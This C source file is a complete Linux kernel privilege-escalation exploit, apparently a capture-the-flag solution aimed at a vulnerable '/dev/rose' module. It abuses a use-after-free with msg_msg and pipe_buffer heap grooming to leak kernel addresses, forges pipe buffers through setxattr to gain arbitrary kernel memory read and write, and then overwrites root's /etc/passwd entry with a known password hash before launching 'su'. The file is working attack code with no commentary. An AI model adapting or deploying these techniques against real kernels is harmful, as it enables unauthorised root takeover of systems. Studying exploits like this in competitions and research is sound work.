#include <stdint.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <stdint.h>

#define __START_KERNEL_map 0xffffffff80000000UL
#define MODPROBE_QW 0x6f6d2f6e6962732fUL
#define PASSWD_QW 0x723a303a303a783a

struct pipe_buffer
{
    uint64_t page;
    unsigned int offset, len;
    uint64_t ops;
    unsigned int flags;
    unsigned long priv;
};

struct pipe_rw
{
    int r, w;
};

typedef struct
{
    long mtype;
    char mtext[0x10000];
} msg;

msg msgbuf;

struct msg_header
{
    void *ll_next;
    void *ll_prev;
    long m_type;
    size_t m_ts;
    void *next;
    void *security;
};

int msg_open()
{
    int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);

    if (qid == -1)
    {
        perror("msgget");
        exit(-1);
    }

    return qid;
}

int msgsend(int qid, void *msg, size_t size, int flag)
{
    int res;

    if ((res = msgsnd(qid, msg, size, flag)) == -1)
    {
        perror("msgsnd");
        exit(-1);
    }

    return res;
}

void dopause(char *msg)
{
    printf("[%s]\n", msg);
    getchar();
}

int memstr(char *haystack, char *needle, long size, long cmpsize)
{
    for (int i = 0; i < size; i++)
    {
        if (memcmp(haystack + i, needle, cmpsize) == 0)
            return 1;
    }

    return 0;
}

char buffer[0x2000];
int qid[2];
int fds[10];
struct pipe_rw p;

uint64_t pbuf_page;
uint64_t pbuf_ops;
uint64_t kernel_base;
uint64_t vmemmap_base;
uint64_t page_offset;
uint64_t modprobe_addr;

uint64_t moduletext;
uint64_t moduleread;
uint64_t modulebss;
uint64_t moduleheap;

void init_devices()
{
    printf("Init devices\n");
    memset(buffer, 0x41, 0x2000);

    for (int i = 0; i < 2; i++)
        qid[i] = msg_open();

    for (int i = 0; i < 10; i++)
        fds[i] = open("/dev/rose", 0);
}

uint64_t virt_to_phys(unsigned long x)
{
    unsigned long y = x - __START_KERNEL_map;

    return x - page_offset;
}

long phys_to_page(long target_object)
{
    return vmemmap_base + (((target_object & 0xffffffff) >> 12) * 0x40);
}

void get_initial_leaks()
{
    int pipe_pair[2];

    printf("Free data\n");
    close(fds[0]);

    printf("Put msg_seq in freed data\n");
    msgsend(qid[0], buffer, 0xfd0 + 0x400 - 0x30, 0);

    printf("Free msg_seq\n");
    close(fds[1]);

    printf("Create pipe\n");
    pipe(pipe_pair);
    p.r = pipe_pair[0];
    p.w = pipe_pair[1];

    printf("Fill pipe buffers in freed data\n");
    memset(buffer, 0x41, 0x100);
    for (int i = 0; i < 0xf1; i++)
    {
        write(p.w, buffer, 0x100);
    }

    printf("Free pipes\n");
    close(fds[2]);

    printf("Put msg_seq in data aligned with pipe buffers\n");
    msgsend(qid[1], buffer, 0xfd0 + 0x400 - 0x200, 0);
    msgrcv(qid[0], buffer, 0xfd0 + 0x400, 0, 0);

    struct pipe_buffer *pbuf = buffer + 0x11d8;

    printf("\n");
    printf("Pipe->page    : %p\n", pbuf->page);
    printf("Pipe->offset  : %p\n", pbuf->offset);
    printf("Pipe->len     : %p\n", pbuf->len);
    printf("Pipe->ops     : %p\n", pbuf->ops);
    printf("Pipe->flags   : %p\n", pbuf->flags);
    printf("Pipe->private : %p\n", pbuf->priv);
    printf("\n");

    pbuf_page = pbuf->page;
    pbuf_ops = pbuf->ops;
    kernel_base = pbuf_ops - 0x161df80;
    vmemmap_base = pbuf_page & ~(0xfffffffULL);
    modprobe_addr = pbuf->ops + 0x633ea0;

    printf("Kernel base   : %p\n", kernel_base);
    printf("VMEMMAP base  : %p\n", vmemmap_base);
    printf("modprobe_path : %p\n", modprobe_addr);
    printf("\n");
}

uint64_t get_addr(char *buf, unsigned long offset)
{
    return *((uint64_t *)(buf + offset));
}

void ghetto_find_flag()
{
    unsigned long *ptr;

    struct pipe_buffer *pbuf = buffer;

    for (long i = 0xef0000; i < 0x3bfff000; i += 0x40)
    {
        // Rewrite pipe buffer in data
        memset(buffer, 0x0, 0x400);

        pbuf->page = pbuf_page + i;
        pbuf->offset = 0x0;
        pbuf->len = 0x1001; // avoid freeing pipe on read
        pbuf->ops = pbuf_ops;
        pbuf->flags = 0x10;
        pbuf->priv = 0x0;

        setxattr("/dev/null", "attr", buffer, 0x400, 0);

        read(p.r, buffer, 0x1000);

        if (memstr(buffer, "hitcon", 0x1000, 6))
        {
            printf("Offset: %p\n", i);
            write(1, buffer, 0x100);
            dopause("found hitcon");
        }
    }
}

void get_additional_leaks()
{
    unsigned long *ptr;

    struct pipe_buffer *pbuf = buffer;

    for (long i = 0x0; i < 0x8000000; i += 0x40)
    {
        // Rewrite pipe buffer in data
        memset(buffer, 0x0, 0x400);

        pbuf->page = pbuf_page + i;
        pbuf->offset = 0x0;
        pbuf->len = 0x1001; // avoid freeing pipe on read
        pbuf->ops = pbuf_ops;
        pbuf->flags = 0x10;
        pbuf->priv = 0x0;

        setxattr("/dev/null", "attr", buffer, 0x400, 0);

        read(p.r, buffer, 0x1000);

        if (memstr(buffer, "rose", 0x1000, 4))
        {
            moduletext = get_addr(buffer, 0x20);
            moduleread = get_addr(buffer, 0x48);
            modulebss = get_addr(buffer, 0x50);
            moduleheap = get_addr(buffer, 0x540);

            if ((moduleread & 0xfff) == 0x36)
            {
                printf("Found moduletext : %p\n", moduletext);
                printf("Found moduleread : %p\n", moduleread);
                printf("Found modulebss  : %p\n", modulebss);
                printf("Found moduleheap : %p\n", moduleheap);
                printf("\n");
                break;
            }
        }
    }
}

unsigned long find_modprobe_off()
{
    printf("Search modprobe_path region page offset");

    uint64_t mpqw = 0;
    uint64_t moff = 0;

    page_offset = moduleheap & ~(0x3fffffff);

    unsigned long *ptr;

    while (mpqw != MODPROBE_QW)
    {
        struct pipe_buffer pipe = {
            .page = phys_to_page(virt_to_phys(page_offset + moff)),
            .offset = 0xe20,
            .len = 0x100,
            .ops = pbuf_ops,
            .flags = 0x10,
            .priv = 0x0};

        ptr = &pipe;
        moff += 0x1000;

        setxattr("/dev/null", "attr", ptr, 0x400 - 0x30, 0);
        memset(buffer, 0x42, 8);
        read(p.r, buffer, 8);

        ptr = buffer;
        mpqw = *ptr;
    }

    moff -= 0x1000;

    return moff;
}

unsigned long find_passwd_off()
{
    printf("Search passwd region page offset");

    uint64_t mpqw = 0;
    uint64_t moff = 0;

    page_offset = moduleheap & ~(0x3fffffff);

    unsigned long *ptr;

    while (mpqw != PASSWD_QW)
    {
        struct pipe_buffer pipe = {
            .page = phys_to_page(virt_to_phys(page_offset + moff)),
            .offset = 0x4,
            .len = 0x100,
            .ops = pbuf_ops,
            .flags = 0x10,
            .priv = 0x0};

        ptr = &pipe;
        moff += 0x1000;

        setxattr("/dev/null", "attr", ptr, 0x400 - 0x30, 0);
        memset(buffer, 0x42, 8);
        read(p.r, buffer, 8);

        ptr = buffer;
        mpqw = *ptr;
    }

    moff -= 0x1000;

    return moff;
}

void read_address(unsigned long address, unsigned long moff, unsigned int size)
{
    struct pipe_buffer pbfs[0x20];

    unsigned long target_addr = address;
    unsigned long target_page_off;

    if (address < modprobe_addr)
        target_page_off = moff - (modprobe_addr - 0xe20 - (target_addr & ~(0xfff)));
    else
        target_page_off = moff + ((target_addr & ~(0xfff)) - (modprobe_addr - 0xe20));

    unsigned long target_offset = target_addr & 0xfff;

    struct pipe_buffer pipe = {
        .page = phys_to_page(virt_to_phys(page_offset + target_page_off)),
        .offset = target_offset,
        .len = size + 1,
        .ops = pbuf_ops,
        .flags = 0x10,
        .priv = 0x0};

    for (int i = 0; i < 0x20; ++i)
        pbfs[i] = pipe;

    unsigned long *ptr = &pbfs[0];

    setxattr("/dev/null", "attr", ptr, 0x400 - 0x30, 0);

    read(p.r, buffer, size);
}

void write_address(unsigned long address, unsigned long moff, unsigned int size)
{
    struct pipe_buffer pbfs[0x20];

    unsigned long target_addr = address;
    unsigned long target_page_off;

    if (address < modprobe_addr)
    {
        target_page_off = moff - (modprobe_addr - 0xe20 - (target_addr & ~(0xfff)));
    }
    else
    {
        target_page_off = moff + ((target_addr & ~(0xfff)) - (modprobe_addr - 0xe20));
    }

    unsigned long target_offset = target_addr & 0xfff;

    // For read set len, for write set len to 0x0
    struct pipe_buffer pipe = {
        .page = phys_to_page(virt_to_phys(page_offset + target_page_off)),
        .offset = target_offset,
        .len = 0,
        .ops = pbuf_ops,
        .flags = 0x10,
        .priv = 0x0};

    for (int i = 0; i < 0x20; ++i)
        pbfs[i] = pipe;

    unsigned long *ptr = &pbfs[0];

    setxattr("/dev/null", "attr", ptr, 0x400 - 0x30, 0);

    write(p.w, buffer, size);
}

void exploit_arb()
{
    page_offset = moduleheap & ~(0x3fffffff);

    unsigned long moff = find_modprobe_off();

    printf("moff    : %p\n", moff);

    memset(buffer, 0x41, 0x500);

    read_address(kernel_base, moff, 0x100);
    write(1, buffer, 0x100);
}

void exploit_passwd()
{
    page_offset = moduleheap & ~(0x3fffffff);

    unsigned long moff = find_passwd_off();

    struct pipe_buffer pbfs[0x20];

    struct pipe_buffer pipe = {
        .page = phys_to_page(virt_to_phys(page_offset + moff)),
        .offset = 0,
        .len = 0,
        .ops = pbuf_ops,
        .flags = 0x10,
        .priv = 0x0};

    for (int i = 0; i < 0x20; ++i)
    {
        pbfs[i] = pipe;
    }

    unsigned long *ptr = &pbfs[0];

    printf("offset: %#llx\n", moff);

    setxattr("/dev/null", "attr", ptr, 0x400 - 0x30, 0);
    strcpy(buffer, "root:$1$3S6VifHx$WxudbKqG7.8g7dwuUg0H30:0:0:root:/root:/bin/sh\n");
    write(p.w, buffer, strlen(buffer));

    printf("Password: passwd\n");
    system("su");
}

int main(int argc, char *argv[])
{
    init_devices();
    get_initial_leaks();
    // ghetto_find_flag();
    get_additional_leaks();
    exploit_passwd();
    // exploit_arb();

    dopause("End");
}